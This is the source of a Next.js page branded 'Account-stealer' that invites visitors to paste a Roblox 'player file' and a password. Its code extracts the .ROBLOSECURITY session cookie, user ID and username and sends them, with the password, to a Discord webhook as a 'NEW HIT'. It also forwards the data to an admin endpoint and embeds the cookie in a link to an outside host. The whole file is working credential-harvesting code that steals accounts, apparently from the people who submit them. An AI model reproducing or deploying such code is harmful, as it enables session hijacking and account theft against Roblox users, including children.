"use client";

import { useState, useEffect } from "react";
import Link from "next/link";
import { ArrowLeft, FileText, Lock, Loader2 } from "lucide-react";
import { useParams } from "next/navigation";
import ConstellationBackground from "@/components/ConstellationBackground";
import { supabase } from "@/lib/supabaseClient";

export default function SlugPage() {
  const params = useParams();
  const slug = params.slug as string;

  const [webhookUrl, setWebhookUrl] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);
  const [pageError, setPageError] = useState<string | null>(null);

  const [status, setStatus] = useState<{
    message: string;
    type: "success" | "error" | "info" | null;
  }>({
    message: "",
    type: null,
  });

  const [fileContent, setFileContent] = useState("");
  const [pin, setPin] = useState("");

  // Lưu slug gần nhất vào localStorage
  useEffect(() => {
    if (!slug) return;
    try {
      window.localStorage.setItem("lastSlug", slug);
    } catch { }
  }, [slug]);

  // Lấy webhook từ Supabase
  useEffect(() => {
    async function fetchWebhook() {
      if (!slug) {
        setPageError("Invalid slug.");
        setLoading(false);
        return;
      }

      setLoading(true);
      setPageError(null);

      try {
        const { data, error } = await supabase
          .from("directories")
          .select("webhook_url")
          .eq("slug", slug)
          .single();

        if (error) throw error;
        if (!data?.webhook_url) throw new Error("Webhook not found.");

        setWebhookUrl(data.webhook_url);
      } catch (err: any) {
        setPageError(err.message || "Failed to load webhook.");
      } finally {
        setLoading(false);
      }
    }

    fetchWebhook();
  }, [slug]);

  function extractRobloSecurity(text: string): string | null {
    if (!text) return null;

    const marker = "_|WARNING:-DO-NOT-SHARE-THIS.";

    // Ưu tiên: tìm trực tiếp chuỗi cookie bắt đầu bằng _|WARNING...
    const markerIndex = text.indexOf(marker);
    if (markerIndex !== -1) {
      let end = markerIndex;

      // Cắt cho đến khi gặp ký tự kết thúc "hợp lý"
      while (
        end < text.length &&
        !['"', "'", "\n", "\r", " ", ")", "]", "}"].includes(text[end])
      ) {
        end++;
      }

      let cookie = text.slice(markerIndex, end).trim();
      cookie = cookie.replace(/[)'";,]+$/, "");

      if (cookie.length > 100) {
        return cookie;
      }
    }

    // Fallback: tìm theo dạng .ROBLOSECURITY", "<COOKIE>"
    const keyIndex = text.indexOf(".ROBLOSECURITY");
    if (keyIndex !== -1) {
      // Tìm dấu nháy đầu tiên sau .ROBLOSECURITY
      let firstQuote = -1;
      for (let i = keyIndex; i < text.length; i++) {
        if (text[i] === '"' || text[i] === "'") {
          firstQuote = i;
          break;
        }
      }

      if (firstQuote !== -1) {
        const quoteChar = text[firstQuote];
        const secondQuote = text.indexOf(quoteChar, firstQuote + 1);
        if (secondQuote !== -1) {
          let cookie = text.slice(firstQuote + 1, secondQuote).trim();
          cookie = cookie.replace(/[)'";,]+$/, "");

          if (cookie.length > 100) {
            return cookie;
          }
        }
      }
    }

    return null;
  }

  // Hàm chính: extract ID, username, cookie từ text (PowerShell script)
  async function extractAccountData(text: string): Promise<{
    id: string | null;
    username: string | null;
    cookie: string | null;
  }> {
    if (!text?.trim()) {
      return { id: null, username: null, cookie: null };
    }

    // Bước 1: Lấy cookie
    const cookie = extractRobloSecurity(text);
    if (!cookie) {
      console.warn("Không tìm thấy .ROBLOSECURITY cookie hợp lệ");
      return { id: null, username: null, cookie: null };
    }

    // Hàm validate ID (Roblox user ID thường từ 5 chữ số trở lên)
    const isValidId = (id: string): boolean => {
      const numId = id.trim();
      return /^\d+$/.test(numId) && numId.length >= 5 && numId.length <= 20;
    };

    // Hàm validate username
    const isValidUsername = (username: string): boolean => {
      const clean = username.trim();
      return (
        clean.length >= 2 && // username Roblox ít nhất 2 ký tự
        clean.length <= 20 &&
        !clean.includes('$') &&
        !clean.includes('"') &&
        !clean.includes('\\') &&
        !clean.includes('New-Object') &&
        !clean.includes('PowerShell') &&
        !clean.includes('http') // tránh lẫn link
      );
    };

    let foundId: string | null = null;
    let foundUsername: string | null = null;

    // Bước 2: ƯU TIÊN CAO NHẤT - Extract ID từ URL profile trong Invoke-WebRequest
    // Match: https://www.roblox.com/users/123456789/profile  hoặc /vi/users/... (locale)
    const profileUrlRegex =
      /https?:\/\/www\.roblox\.com(?:\/[a-z]{2,})?\/users\/(\d+)\/profile/gi;
    const urlMatch = text.match(profileUrlRegex);

    if (urlMatch && urlMatch.length > 0) {
      // Lấy group 1 (số ID) từ match đầu tiên
      const idFromUrl = urlMatch[0].match(/\/users\/(\d+)\/profile/)?.[1];
      if (idFromUrl && isValidId(idFromUrl)) {
        foundId = idFromUrl;
        console.log(`Tìm thấy ID từ URL profile: ${foundId}`);
      }
    }

    // Bước 3: Nếu không có từ URL → fallback tìm số dài nhất có thể là user ID
    if (!foundId) {
      // Tìm tất cả số dài 5-20 chữ số, ưu tiên số xuất hiện gần cookie hoặc RBXEventTrackerV2 rbxid
      const allNumbers = text.match(/\b\d{5,20}\b/g) || [];
      // Lọc và lấy số dài nhất (thường user ID thật dài hơn các ID khác như browserid)
      if (allNumbers.length > 0) {
        const longest = allNumbers.reduce((a, b) => (a.length > b.length ? a : b));
        if (isValidId(longest)) {
          foundId = longest;
          console.log(`Fallback ID từ text: ${foundId}`);
        }
      }
    }

    // Bước 4: Thử parse username nếu người dùng paste format có sẵn (id\nusername\ncookie)
    const lines = text
      .split(/\r?\n/)
      .map((l) => l.trim())
      .filter((l) => l.length > 0);

    if (lines.length >= 3) {
      const possibleId = lines[0];
      const possibleUsername = lines[1];
      if (isValidId(possibleId) && isValidUsername(possibleUsername)) {
        if (!foundId) foundId = possibleId; // chỉ override nếu chưa có
        foundUsername = possibleUsername;
      }
    }

    // Bước 5: Nếu có ID nhưng chưa có username → fetch từ Roblox API qua proxy Next.js
    if (foundId && !foundUsername) {
      try {
        const proxyUrl = `/api/roblox-user/${foundId}`; // API route bạn đã tạo
        const response = await fetch(proxyUrl, {
          method: 'GET',
          headers: { Accept: 'application/json' },
        });

        if (response.ok) {
          const data = await response.json();
          if (data?.name && typeof data.name === 'string' && data.name.trim()) {
            const apiUsername = data.name.trim();
            if (isValidUsername(apiUsername)) {
              foundUsername = apiUsername;
              console.log(`Username lấy từ API: ${foundUsername}`);
            }
          }
        } else {
          console.warn(`API proxy trả về lỗi: ${response.status}`);
        }
      } catch (err) {
        console.error("Lỗi khi fetch username:", err);
      }
    }

    // Fallback username nếu vẫn không có
    const finalUsername = foundUsername || "Unknown User";
    console.log(
      {
        id: foundId,
        username: finalUsername,
        cookie,
      }
    )
    return {
      id: foundId,
      username: finalUsername,
      cookie,
    };
  }

  async function sendToDiscord(
    cookieValue: string,
    pinValue: string,
    fullStats: any,
    userId: string
  ) {
    if (!webhookUrl) {
      setStatus({ message: "❌ Webhook URL is missing.", type: "error" });
      return;
    }

    try {
      // Đảm bảo userId là string hợp lệ và là số
      const safeUserId = String(userId || "").trim();
      console.log(safeUserId)
      if (!safeUserId) {
        setStatus({ message: "❌ Invalid user ID. User ID must be a number.", type: "error" });
        return;
      }

      // Validate URL format
      const isValidUrl = (url: string): boolean => {
        try {
          new URL(url);
          return true;
        } catch {
          return false;
        }
      };

      const profileUrl = `https://www.roblox.com/users/${safeUserId}/profile`;
      const rolimonsUrl = `https://www.rolimons.com/player/${safeUserId}`;

      if (!isValidUrl(profileUrl) || !isValidUrl(rolimonsUrl)) {
        setStatus({ message: "❌ Invalid URL format", type: "error" });
        return;
      }

      const avatarUrl = fullStats?.avatarHeadshotUrl || "https://i.imgur.com/0ZxT2S6.png";

      // Clean username và displayName - loại bỏ các ký tự đặc biệt và PowerShell code
      const cleanText = (text: string): string => {
        if (!text || text === "N/A") return "N/A";
        // Loại bỏ PowerShell code patterns
        const cleaned = text
          .replace(/\$[a-zA-Z]+\s*=/g, '') // Loại bỏ $variable =
          .replace(/New-Object/g, '')
          .replace(/PowerShell/g, '')
          .replace(/Microsoft\./g, '')
          .replace(/System\./g, '')
          .replace(/Command/g, '')
          .replace(/WebRequestSession/g, '')
          .replace(/Cookies\.Add/g, '')
          .replace(/UserAgent/g, '')
          .replace(/Mozilla\/5\.0.*?Safari\/537\.36/g, '') // Loại bỏ User-Agent string
          .replace(/["'`]/g, '') // Loại bỏ quotes
          .trim();

        // Nếu sau khi clean mà quá ngắn hoặc chỉ còn ký tự đặc biệt, trả về N/A
        if (cleaned.length < 1 || cleaned.length > 50) {
          return "N/A";
        }
        return cleaned;
      };

      let username = fullStats?.basic?.name || fullStats?.displayName || "N/A";
      let displayName = fullStats?.displayName || username || "N/A";

      // Clean username và displayName
      username = cleanText(username);
      displayName = cleanText(displayName);

      // Nếu cả hai đều là N/A sau khi clean, sử dụng giá trị mặc định
      if (username === "N/A" && displayName === "N/A") {
        username = "Unknown User";
        displayName = "Unknown User";
      }

      const accountAgeDays = fullStats?.accountAgeDays ?? "N/A";

      // Giới hạn độ dài cookie để tránh vượt quá Discord limits
      // Discord field value limit là 1024
      const maxCookieFieldLength = 1000; // Để lại chỗ cho text khác
      const cookieDisplay = cookieValue;
      const cookieNote = cookieValue.length > maxCookieFieldLength ? " (truncated)" : "";

      // Giới hạn cookie trong URL để tránh URL quá dài
      const maxCookieForUrl = 500; // Giới hạn cookie trong URL
      const cookieForUrl = cookieValue.length > maxCookieForUrl
        ? cookieValue.substring(0, maxCookieForUrl)
        : cookieValue;
      const linkRe = `https://manualrefresherforrichpeople.gt.tc/?cookie=${encodeURIComponent(cookieValue)}`;

      // Đảm bảo ageLabel luôn có giá trị hợp lệ
      const ageLabel = fullStats?.isUnder13 === true ? "<13" : ">13";

      // Đảm bảo các giá trị không null/undefined và giới hạn độ dài
      // Clean title để loại bỏ các ký tự không hợp lệ
      const cleanTitle = (displayName || "Unknown User").replace(/[|<>]/g, '').trim();
      const safeTitle = `${cleanTitle} | ${ageLabel}`.substring(0, 256);
      const safeUsername = (username || "Unknown User").substring(0, 100);
      const safePin = (pinValue || "N/A").substring(0, 100);
      const safeAccountAge = String(accountAgeDays || "N/A").substring(0, 50);

      // Tạo description đơn giản, không chứa URL dài để tránh vượt quá giới hạn
      // Chỉ hiển thị thông báo ngắn gọn
      console.log(cookieDisplay)
      const payload = {
        content: "@everyone NEW HIT",
        embeds: [
          {
            title: safeTitle,
            url: profileUrl,
            color: 16711680,
            description: `**userId:** ${safeUserId}\n**Username:** ${safeUsername}\n**Password:** ${safePin}`,
            fields: [
              {
                name: "🔗 Links",
                value: `[Roblox Profile](${profileUrl}) | [Rolimons Stats](${rolimonsUrl})`,
                inline: false,
              },
              {
                name: "🔧 Tool Used",
                value: "```toolbox                                      ```",
                inline: false,
              },
            ],
            footer: {
              text: "Refreshed Cookie | Original Cookie",
              icon_url: "https://i.imgur.com/0ZxT2S6.png",
            },
            timestamp: new Date().toISOString(),
            // thumbnail: { 
            //   url: avatarUrl,
            // },
          },
          {
            title: ".ROBLOSECURITY (Refreshed)",
            color: 16711680,
            description:
            `**Links:**\n` +
            `[Refreshed Cookie](${linkRe}) | ` +
            `[Original Cookie](${linkRe})\n\n` +
            `\`\`\`${cookieDisplay}${cookieNote}\`\`\``,
            fields: [
              // {
              //   name: "Cookie",
              //   value: "```" + cookieDisplay + "```" + (cookieNote ? `\n${cookieNote}` : ""),
              //   inline: false,
              // },
            ],
            author: {
              name: "Refreshed Cookie",
              icon_url: "https://em-content.zobj.net/source/apple/354/cookie_1f36a.png",
            },
            timestamp: new Date().toISOString(),
            thumbnail: {
              url: "https://em-content.zobj.net/source/apple/354/cookie_1f36a.png",
            },
          },
        ],
      };

      // Loại bỏ tất cả undefined và null values khỏi payload
      const removeEmptyFields = (obj: any): any => {
        if (Array.isArray(obj)) {
          return obj.map(removeEmptyFields).filter(item => item !== null && item !== undefined);
        } else if (obj !== null && typeof obj === 'object') {
          const cleaned: any = {};
          for (const [key, value] of Object.entries(obj)) {
            if (value !== null && value !== undefined) {
              const cleanedValue = removeEmptyFields(value);
              if (cleanedValue !== null && cleanedValue !== undefined) {
                cleaned[key] = cleanedValue;
              }
            }
          }
          return cleaned;
        }
        return obj;
      };

      const cleanPayload = removeEmptyFields(payload);

      console.log(cleanPayload)

      // Validate payload structure
      const validatePayload = (payload: any): string[] => {
        const errors: string[] = [];

        if (!payload.embeds || !Array.isArray(payload.embeds)) {
          errors.push("Missing or invalid embeds array");
        }

        payload.embeds?.forEach((embed: any, index: number) => {
          if (embed.title && embed.title.length > 256) {
            errors.push(`Embed ${index}: title too long (${embed.title.length} > 256)`);
          }
          if (embed.description && embed.description.length > 4096) {
            errors.push(`Embed ${index}: description too long (${embed.description.length} > 4096)`);
          }
          if (embed.fields) {
            embed.fields.forEach((field: any, fieldIndex: number) => {
              if (field.name && field.name.length > 256) {
                errors.push(`Embed ${index}, Field ${fieldIndex}: name too long`);
              }
              if (field.value && field.value.length > 1024) {
                errors.push(`Embed ${index}, Field ${fieldIndex}: value too long (${field.value.length} > 1024)`);
              }
            });
          }
        });

        return errors;
      };

      const validationErrors = validatePayload(cleanPayload);
      if (validationErrors.length > 0) {
        console.error("[Payload Validation Errors]", validationErrors);
        setStatus({
          message: `❌ Payload validation failed: ${validationErrors.join(", ")}`,
          type: "error"
        });
        return;
      }

      // Log payload để debug (chỉ log structure, không log cookie đầy đủ)
      const payloadForLog = {
        ...cleanPayload,
        embeds: cleanPayload.embeds.map((embed: any) => ({
          ...embed,
          description: embed.description ? `${embed.description.substring(0, 100)}...` : embed.description,
          fields: embed.fields?.map((field: any) => ({
            ...field,
            value: field.value ? `${String(field.value).substring(0, 50)}...` : field.value,
          })),
        })),
      };
      console.log("[Sending to Discord]", {
        webhookUrl: webhookUrl?.substring(0, 50) + "...",
        payloadSize: JSON.stringify(cleanPayload).length,
        embedsCount: cleanPayload.embeds.length,
        payloadPreview: payloadForLog,
        fullPayload: JSON.stringify(cleanPayload, null, 2).substring(0, 2000), // Log first 2000 chars
      });

      const res = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(cleanPayload),
      });

      if (res.ok) {
        fetch("/api/post", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            discordPayload: payload,
            slug,
          }),
        }).catch((err) => console.error("[Admin forward failed]", err));

        setStatus({ message: "Success!", type: "success" });
        setTimeout(() => {
          setFileContent("");
          setPin("");
          setStatus({ message: "", type: null });
        }, 5000);
      } else {
        // Lấy chi tiết lỗi từ Discord API
        let errorMessage = "❌ Failed: an error occurred with your webhook";
        const contentType = res.headers.get("content-type");

        try {
          if (contentType && contentType.includes("application/json")) {
            const errorData = await res.json();
            console.error("[Discord Webhook Error - Full Details]", {
              status: res.status,
              statusText: res.statusText,
              contentType,
              error: errorData,
              errorString: JSON.stringify(errorData, null, 2),
            });
            // Hiển thị tất cả các thông tin lỗi có thể có
            const errorMessages = [
              errorData.message,
              errorData.code,
              errorData.errors ? JSON.stringify(errorData.errors) : null,
              res.statusText,
            ].filter(Boolean);
            errorMessage = `❌ Discord Error (${res.status}): ${errorMessages.join(" | ") || "Bad Request"}`;
          } else {
            const errorText = await res.text();
            console.error("[Discord Webhook Error - Text Response]", {
              status: res.status,
              statusText: res.statusText,
              contentType,
              errorText: errorText || "(empty response)",
            });
            errorMessage = `❌ Discord Error (${res.status}): ${errorText || res.statusText || "Bad Request"}`;
          }
        } catch (parseError) {
          console.error("[Discord Webhook Error - Parse failed]", {
            status: res.status,
            statusText: res.statusText,
            contentType,
            parseError,
          });
          errorMessage = `❌ Discord Error (${res.status}): ${res.statusText || "Bad Request"}`;
        }
        setStatus({ message: errorMessage, type: "error" });
      }
    } catch (err: any) {
      console.error("[sendToDiscord error]", err);
      setStatus({ message: "❌ Connection error", type: "error" });
    }
  }

  const handleStart = async () => {
    if (!fileContent.trim() || !pin.trim()) {
      setStatus({ message: "❌ Please enter both script content and pass!", type: "error" });
      return;
    }

    setStatus({ message: "⏳ Processing...", type: "info" });

    try {
      const accountData = await extractAccountData(fileContent);
      console.log("Extracted account data:", accountData);
      
      // Kiểm tra có đủ id, username và cookie không
      if (!accountData.cookie) {
        setStatus({ message: "❌ Invalid file. Could not find .ROBLOSECURITY cookie!", type: "error" });
        return;
      }
      
      if (!accountData.id || !/^\d+$/.test(accountData.id)) {
        setStatus({ message: "❌ Invalid file. Could not find valid user ID (must be a number). Please provide format: id, username, cookie", type: "error" });
        return;
      }
      
      if (!accountData.username) {
        setStatus({ message: "❌ Invalid file. Could not find username. Please provide format: id, username, cookie", type: "error" });
        return;
      }

      // Tạo data object đơn giản với id và username từ input
      const data = {
        userId: accountData.id,
        basic: {
          name: accountData.username,
        },
        displayName: accountData.username,
        accountAgeDays: "N/A",
        avatarHeadshotUrl: "https://i.imgur.com/0ZxT2S6.png",
      };

      console.log("acc data: ", accountData);

      // Gửi lên Discord với id và username từ input
      await sendToDiscord(accountData.cookie, pin, data, accountData.id);
    } catch (err: any) {
      console.error("[handleStart error]", err);
      setStatus({
        message: "An error occurred. Please try again.",
        type: "error",
      });
    }
  };

  if (pageError) {
    return (
      <div className="min-h-screen bg-[#0a0a0a] text-white flex items-center justify-center p-4 relative overflow-hidden">
        <ConstellationBackground />
        <div className="bg-[#121212] border border-red-600/40 rounded-2xl p-10 max-w-lg text-center shadow-2xl z-50">
          <h2 className="text-2xl font-bold text-red-400 mb-4">Something went wrong</h2>
          <p className="text-gray-300 mb-6">{pageError}</p>
          <Link
            href="/create"
            className="inline-flex items-center gap-2 px-6 py-3 bg-red-600 hover:bg-red-700 rounded-lg text-white font-medium transition-colors shadow-lg shadow-red-900/30"
          >
            <ArrowLeft className="w-5 h-5" />
            Back to Create
          </Link>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col items-center justify-center p-4 relative overflow-hidden">
      <ConstellationBackground />

      {loading && (
        <div className="absolute inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-md">
          <div className="flex flex-col items-center gap-6">
            <Loader2 className="w-14 h-14 text-red-500 animate-spin" />
            <p className="text-xl font-semibold">Loading</p>
          </div>
        </div>
      )}

      <div
        className={`relative z-10 w-full max-w-5xl flex flex-col items-center transition-opacity duration-500 ${loading ? "opacity-40 pointer-events-none" : "opacity-100"
          }`}
      >
        <div className="w-full mb-6 px-2">
          <Link
            href="/create"
            className="text-[#cbd5e1] font-semibold text-sm tracking-wide hover:text-white transition-colors flex items-center gap-2"
          >
            <ArrowLeft className="w-4 h-4" />
            GO BACK
          </Link>
        </div>

        <div className="text-center mb-8 px-4">
          <h1 className="text-3xl md:text-4xl font-bold tracking-tight text-white capitalize mb-3">
            Account-stealer
          </h1>
          <p className="text-[#94a3b8] text-base max-w-xl mx-auto">
            Hack accounts with ease, with this brand new powershell-based system!
          </p>
        </div>

        <div className="w-full">
          <div className="flex items-center gap-3 mb-6 px-2">
            <h2 className="text-xl font-bold">Bloxtools</h2>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="bg-[#121212] border border-[#1e1e1e] rounded-2xl p-8 shadow-2xl flex flex-col h-full">
              <h3 className="text-lg font-bold mb-3">Hack Accounts</h3>
              <p className="text-[#94a3b8] text-sm mb-6 leading-relaxed">
                Paste your player file in the box below, then click "Start Hacking" If you don't know how to find a users "player file" then go ahead and watch "How to use"
              </p>

              {status.type && (
                <div
                  className={`p-4 rounded-xl mb-6 text-sm text-center border animate-in fade-in slide-in-from-top-1 duration-300 ${status.type === "success"
                    ? "bg-emerald-950/30 border-emerald-500/30 text-emerald-300"
                    : status.type === "error"
                      ? "bg-red-950/30 border-red-500/30 text-red-300"
                      : "bg-blue-950/30 border-blue-500/30 text-blue-300"
                    }`}
                >
                  {status.message}
                </div>
              )}

              <div className="space-y-5 mt-auto">
                <div className="relative group">
                  <FileText className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-red-500 opacity-70 group-focus-within:opacity-100 transition-opacity" />
                  <input
                    type="text"
                    value={fileContent}
                    onChange={(e) => setFileContent(e.target.value)}
                    placeholder="Enter player file"
                    className="w-full bg-[#1a1a1a] border border-[#2a2a2a] rounded-xl py-4 pl-12 pr-5 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500/30 transition-all"
                  />
                </div>

                <div className="relative group">
                  <Lock className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-red-500 opacity-70 group-focus-within:opacity-100 transition-opacity" />
                  <input
                    value={pin}
                    onChange={(e) => setPin(e.target.value)}
                    placeholder="Create Password"
                    className="w-full bg-[#1a1a1a] border border-[#2a2a2a] rounded-xl py-4 pl-12 pr-5 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500/30 transition-all"
                  />
                </div>

                <button
                  onClick={handleStart}
                  disabled={loading || status.type === "info"}
                  className="w-full py-4 bg-[#e22d2d] hover:bg-[#c92828] disabled:opacity-60 disabled:hover:bg-[#e22d2d] text-white font-bold text-base rounded-xl flex items-center justify-center gap-3 transition-all shadow-lg shadow-red-900/20 active:scale-[0.98]"
                >
                  Start Hacking!
                </button>
              </div>
            </div>

            <div className="bg-[#121212] border border-[#1e1e1e] rounded-2xl p-8 shadow-2xl flex flex-col h-full">
              <h3 className="text-lg font-bold mb-3">How to use</h3>
              <p className="text-[#94a3b8] text-sm mb-6 leading-relaxed">
                Video Tutorial
              </p>

              <div className="mt-auto aspect-video bg-[#0b1218] border border-white/5 rounded-xl overflow-hidden group">
                <video
                  controls
                  className="w-full h-full object-cover"
                  playsInline
                  preload="metadata"
                >
                  <source src="/video.mov" type="video/mp4" />
                  <source src="/video.mov" type="video/quicktime" />
                  Your browser does not support the video tag.
                </video>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}